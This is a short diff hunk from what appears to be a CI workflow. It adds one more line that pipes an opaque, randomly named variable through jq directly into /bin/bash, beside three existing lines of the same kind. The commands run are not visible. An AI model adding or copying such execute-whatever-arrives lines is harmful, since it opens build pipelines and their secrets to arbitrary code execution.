@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$fh872" | jq -r .eun89 | /bin/bash
           echo $w0211 | jq -r .f391 | /bin/bash
           printf '%s' "$ve30" | jq -r .lqk87 | /bin/bash
+          echo $cfe001 | jq -r .mpc6 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
